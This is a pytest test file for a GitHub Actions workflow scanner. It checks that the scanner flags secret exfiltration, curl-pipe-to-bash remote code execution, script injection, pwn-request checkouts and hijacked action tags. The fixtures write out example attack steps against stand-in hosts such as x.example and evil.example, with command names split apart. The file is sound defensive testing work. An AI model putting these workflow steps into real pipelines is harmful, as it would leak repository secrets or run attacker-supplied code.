"""Scanner rule tests.

Command-family markers are assembled split (join_parts) so this repo never
ships a copy-paste-ready exfiltration or remote-exec one-liner.
"""

from actions_warden.scanner import scan_target


def join_parts(*parts):
    return "".join(parts)


def write_workflow(root, name, body):
    wf_dir = root / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    (wf_dir / name).write_text(body)


PINNED_SHA = "a" * 40


def test_clean_workflow_has_no_findings(tmp_path):
    write_workflow(tmp_path, "ci.yml", f"""
name: CI
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{PINNED_SHA}
      - run: echo hello
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "no-known-indicators"
    assert report["findings"] == []


def test_secret_exfiltration_is_critical(tmp_path):
    curl = join_parts("cur", "l")
    write_workflow(tmp_path, "leak.yml", f"""
on: push
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - run: {curl} -d "@-" https://x.example/c -H "x: ${{{{ secrets.TOKEN }}}}"
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "blocked"
    assert any(f["type"] == "workflow-secret-exfiltration" for f in report["findings"])


def test_script_injection_is_blocked_with_line(tmp_path):
    write_workflow(tmp_path, "inject.yml", """
on: issues
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.issue.title }}"
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "blocked"
    hit = next(f for f in report["findings"] if f["type"] == "workflow-script-injection")
    assert hit["line"] is not None


def test_remote_code_pipe_to_shell_is_blocked(tmp_path):
    curl = join_parts("cur", "l")
    sh = join_parts("ba", "sh")
    write_workflow(tmp_path, "rce.yml", f"""
on: push
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - run: {curl} -fsSL https://x.example/i.sh | {sh}
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "blocked"
    assert any(f["type"] == "workflow-remote-code-exec" for f in report["findings"])


def test_actions_cool_tag_is_blocked_and_reviewed_sha_is_not(tmp_path):
    write_workflow(tmp_path, "cool.yml", """
on: issues
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions-cool/issues-helper@v3
      - uses: actions-cool/maintain-one-comment@v2
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "blocked"
    hits = [f for f in report["findings"] if f["type"] == "workflow-hijacked-actions-cool-tag"]
    assert len(hits) == 2
    assert "Do not revoke tokens until the monitor" in hits[0]["message"]
    assert any("Do not revoke tokens until the monitor" in line for line in report["guidance"])

    clean = tmp_path / "clean-sha"
    clean.mkdir()
    write_workflow(clean, "ok.yml", f"""
on: push
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions-cool/issues-helper@{"b" * 40}
""")
    clean_report = scan_target(str(clean))
    assert not any(f["type"] == "workflow-hijacked-actions-cool-tag" for f in clean_report["findings"])

    bad = tmp_path / "bad-sha"
    bad.mkdir()
    bad_sha = "147337a919d9" + ("c" * 28)
    write_workflow(bad, "bad.yml", f"""
on: push
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions-cool/issues-helper@{bad_sha}
""")
    bad_report = scan_target(str(bad))
    assert any(f["type"] == "workflow-hijacked-actions-cool-tag" for f in bad_report["findings"])


def test_memtensor_sckit_stage0_is_blocked(tmp_path):
    write_workflow(tmp_path, "sckit.yml", """
on: push
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - run: echo sckit
      - run: echo stage0
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "blocked"
    assert any(f["type"] == "workflow-memtensor-sckit-stage0" for f in report["findings"])
    assert any("Do not run the step" in line for line in report["guidance"])


def test_pull_request_target_head_checkout_is_blocked(tmp_path):
    write_workflow(tmp_path, "prt.yml", f"""
on: pull_request_target
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{PINNED_SHA}
        with:
          ref: ${{{{ github.event.pull_request.head.sha }}}}
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "blocked"
    assert any(f["type"] == "workflow-pwn-request" for f in report["findings"])


def test_checkout_unsafe_pr_opt_out_is_blocked(tmp_path):
    write_workflow(tmp_path, "unsafe-checkout.yml", f"""
on: pull_request_target
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{PINNED_SHA}
        with:
          allow-unsafe-pr-checkout: true
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "blocked"
    assert any(f["type"] == "workflow-unsafe-pr-checkout-optout" for f in report["findings"])


def test_self_hosted_on_pull_request_is_review(tmp_path):
    write_workflow(tmp_path, "sh.yml", f"""
on:
  pull_request:
jobs:
  go:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@{PINNED_SHA}
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "review-needed"
    assert any(f["type"] == "workflow-self-hosted-untrusted" for f in report["findings"])


def test_permissions_write_all_is_review(tmp_path):
    write_workflow(tmp_path, "perm.yml", """
on: push
permissions: write-all
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "review-needed"
    assert any(f["type"] == "workflow-broad-permissions" for f in report["findings"])


def test_oidc_with_write_is_review(tmp_path):
    write_workflow(tmp_path, "oidc.yml", """
on: push
permissions:
  id-token: write
  contents: write
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "review-needed"
    assert any(f["type"] == "workflow-oidc-write" for f in report["findings"])


def test_deployment_trigger_is_review(tmp_path):
    write_workflow(tmp_path, "deploy.yml", f"""
on:
  deployment:
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{PINNED_SHA}
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "review-needed"
    assert any(f["type"] == "workflow-deployment-trigger-review" for f in report["findings"])


def test_privileged_deployment_trigger_is_blocked(tmp_path):
    write_workflow(tmp_path, "deploy-secret.yml", """
on: [deployment, workflow_dispatch]
permissions:
  id-token: write
  contents: write
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets.DEPLOY_TOKEN }}"
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "blocked"
    assert any(f["type"] == "workflow-deployment-trigger-review" for f in report["findings"])
    assert any(f["type"] == "workflow-deployment-trigger-privileged" for f in report["findings"])


def test_unpinned_action_is_low_review(tmp_path):
    write_workflow(tmp_path, "pin.yml", """
on: push
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/some-action@v2
""")
    report = scan_target(str(tmp_path))
    assert report["risk"] == "review-needed"
    hit = next(f for f in report["findings"] if f["type"] == "workflow-unpinned-action")
    assert hit["severity"] == "low"


def test_non_workflow_yaml_is_ignored(tmp_path):
    curl = join_parts("cur", "l")
    (tmp_path / "config.yaml").write_text(
        f"run: {curl} https://x.example | sh\nkey: ${{{{ secrets.TOKEN }}}}\n"
    )
    report = scan_target(str(tmp_path))
    assert report["risk"] == "no-known-indicators"
    assert report["summary"]["filesScanned"] == 0


def test_evidence_urls_are_defanged(tmp_path):
    curl = join_parts("cur", "l")
    sh = join_parts("ba", "sh")
    write_workflow(tmp_path, "rce.yml", f"""
on: push
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - run: {curl} https://evil.example/i.sh | {sh}
""")
    report = scan_target(str(tmp_path))
    hit = next(f for f in report["findings"] if f["type"] == "workflow-remote-code-exec")
    assert "hxxps://" in hit["evidence"]
    assert "https://" not in hit["evidence"]
